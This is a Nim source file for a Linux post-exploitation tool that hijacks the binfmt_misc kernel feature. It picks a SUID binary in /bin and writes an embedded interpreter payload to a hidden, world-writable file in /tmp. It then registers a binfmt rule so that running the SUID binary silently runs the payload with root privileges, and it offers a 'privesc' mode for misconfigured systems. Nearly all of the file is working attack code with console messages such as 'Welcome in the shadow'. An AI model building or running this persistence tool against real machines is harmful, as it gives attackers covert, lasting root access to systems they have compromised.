import posix
import osproc
import os
import std/posix_utils
import std/strutils
import std/base64
import streams
import terminal

const BINFMT_DIR = "/proc/sys/fs/binfmt_misc/"
const REGISTER_PATH = BINFMT_DIR & "register"
const RULE_NAME {.strdefine.}: string = ".shuid"

const ELF_HEADER = ['\x7F', 'E', 'L', 'F', '\x02', '\x01', '\x01', '\x00']
const HEADER_SIZE = 8
const MAGIC_SIZE = 128

const SUID_PERM = 0o4000
const EXEC_PERM = 0o100

const INTERPRETER_PATH: string = "/tmp/.6wwMkxWeWd"
const INTERPRETER_CONTENT {.strdefine.}: string = ""

proc checkBinfmt(privesc:bool):bool=
  ## Different checks to verify that the binfmt config allow the exploit
  ## - check if BINFMT module is loaded in kernel(config file)
  ## - check if BINFMT is mount
  ## - check if BINFMT is enabled 
  ## - check if the register file is writable by user if privesc mode
  
  # search module in boot config files
  let moduleExist = execCmdEx("grep 'BINFMT_MISC' /boot/config-`uname -r`").exitCode
  if moduleExist != 1:
    styledEcho("⚠️ Do not find ",fgYellow,"BINFMT_MISC module ",fgWhite,"in /boot/config directory")
  
  # is mount?
  let isMount = execCmdEx("mount | grep binfmt_misc")
  if isMount.exitCode != 0:
    styledEcho("⚠️ Failed to ",fgYellow,"execute mount",fgWhite,": ",isMount.output)
    styledEcho("❌ binfmt kernel feature",fgRed," seems to be disabled")
    return false
  elif isMount.output == "":
    styledEcho("⚠️ binfmt is ",fgYellow,"not mounted")
    styledEcho("❌ binfmt kernel feature",fgRed," seems to be disabled")
    styledEcho(fgBlue, "Try mounting binfmt: mount binfmt_misc -t binfmt_misc /proc/sys/fs/binfmt_misc")
    return false

  # check if enable
  let enabled = readFile("/proc/sys/fs/binfmt_misc/status").replace("\n", "")
  case enabled
  of "1","enabled": discard
  else:
    styledEcho("❌ binfmt kernel feature",fgRed," seems to be disabled")
    styledEcho(fgBlue, "Try enabling binfmt with: echo 1 > /proc/sys/fs/binfmt_misc/status")
    return false
  
  # register writable
  if privesc:
    let isRegisterWritable = execCmdEx("test -w /proc/sys/fs/binfmt_misc/register").exitCode
    if isRegisterWritable!=0:
      styledEcho("❌ /proc/sys/fs/binfmt_misc/register ",fgRed," is not writable by user")
      #TODO: Provide a way to the user to specify another way to write into register (e.g /usr/lib/toto/register is writable)
      return false

  return true

proc isSETUID*(m: Mode,s=""): bool =
  ## Determine if a file has setuid bytes set
  ## (see https://github.com/c-blake/lc/blob/master/lc.nim#L568)
  let m = m.uint and 4095
  result = (m and SUID_PERM) != 0 and (m and EXEC_PERM) != 0

proc searchSuid(dir, file: string,chooseSuid: bool): string=
  ## Find SUID fiels in a given directory. if file is filled nothing is done
  ## - chooseSuid parameter make the user chose the file (user input)
  ## - otherwise the suid file is chosen randomly
  
  if file != "": return file

  var suids : seq[string]
  for kind, path in walkDir(dir):
    case kind:
    of pcFile:
      if isSETUID(stat(path).st_mode):
        suids.add(path)
    # of pcLinkToFile:
    #   #symlink
    #   echo "Link to file: ", path
    else: discard
  
  if suids.len == 0: return ""
  if chooseSuid:
    styledEcho(fgBlue, "Specify which suid file to use to hide the shadow suid:")
    for idx, file in suids[0 .. ^1]:
      echo "\t",idx,": ",file
    while true:
      stdout.styledWrite(fgBlue, "⌨️ Please type the number of the file (between 0 and ",$(suids.len-1),"): ")
      let choice = readLine(stdin)
      try:
        if parseInt($choice) < suids.len: return suids[parseInt($choice)]
      except ValueError:
        styledEcho(fgRed, "Please enter a valid integer")
  elif suids.len > 0 : return suids[^1]
  return ""

proc exploit(registerPath, suidPath, interpreterB64: string): void=
  ## Exploit BIN_FMT feature to register a new type of executable
  ## - check that suid is an ELF binary
  ## - create interpreter
  ## - register the interpreter
  
  # read header of suid file(for magic_number)
  let stream = newFileStream(suidPath, mode = fmRead)
  defer: stream.close()
  # Check magic string
  var magicNumber: array[HEADER_SIZE, char]
  discard stream.readData(magicNumber.addr, HEADER_SIZE) 
  if magicNumber != ELF_HEADER:
    styledEcho("❌ SUID file, ",suidPath,fgRed," is not an ELF binary")
    quit(QuitFailure)

  # retrieve interpreter (from now it is done at compilation time)
  # write interpreter in fs
  var interpreter = decode(interpreterB64)
  writeFile(INTERPRETER_PATH, interpreter)
  setFilePermissions(INTERPRETER_PATH, {fpUserWrite, fpUserRead, fpUserExec,fpOthersExec,fpOthersRead,fpOthersWrite})
  styledEcho("✍️ Write interpreter in: ",fgCyan,INTERPRETER_PATH)
  # register interpreter
  stream.setPosition(0)
  var headerSuidHex,registerLine: string
  for i in 1..MAGIC_SIZE:
    headerSuidHex &= "\\x"&toHex($(stream.readChar()))
  registerLine= ":$1:M::$2::$3:C" % [RULE_NAME, headerSuidHex, INTERPRETER_PATH]
  # writeFile(BINFMT_DIR & RULE_NAME, "1")
  try: writeFile(registerPath, registerLine)
  except IOError:
    styledEcho("❌ It seeams that you are ",fgRed,"not authorized to write in ", registerPath)
    styledEcho(fgblue,"~> Try running shuid with sudo")
    removeFile(INTERPRETER_PATH)
    quit(QuitFailure)

  writeFile(registerPath, registerLine)
  styledEcho("🗒️ Register interpreter in: ",fgCyan, BINFMT_DIR & RULE_NAME)

  

  # BOOM!
  echo("🌒  binfmt has been exploited to maintain privileged persistence.")
  styledEcho(styleDim,"\nWelcome in the shadow") 
  styledEcho(styleDim,"😈 Persistence command is shadowing and will be triggered with the command ", suidPath, fgBlack)
  styledEcho(styleDim,"Unregister the persistence command with  echo '-1' | sudo tee /proc/sys/fs/binfmt_misc/", RULE_NAME, " && sudo rm ",INTERPRETER_PATH)


proc shuid(
  privesc = false, 
  check = true, 
  file = "", 
  searchDir="/bin", 
  chooseSuid = false,
  noExec=false
  ): void =
  ## shuid is define command line arguments to perform shadow suid file
  #[
    TODO:
      - Get interpreter binary content from HTTP (not statically linked)
      - Specify interpreter name and location
  ]#
  if check:
    if checkBinfmt(privesc):
      styledEcho("✔️ binfmt kernel feature is",fgGreen," enabled")
    else: quit(QuitFailure)

  # Search SUID file to hide our payload
  let suid = searchSuid(searchDir,file,chooseSuid)
  if suid != "": styledEcho("🎯 SUID target file: ",fgCyan,suid)
  else:
    styledEcho("❌ No SUID file in ",fgRed,searchDir)
    quit(QuitFailure)

  exploit(REGISTER_PATH,suid,INTERPRETER_CONTENT)

when isMainModule:
  import cligen;  dispatch shuid, help={"privesc": "run in unprivileged mode to obtain privesc",
  "check": "perform exploit requirement checks",
  "file": "SUID file to use",
  "searchDir": "directory use to find SUID file",
  "chooseSuid": "choose SUID file to use from the list (if not taken randomly)",
  "noExec": "do not exec SUID file"
  }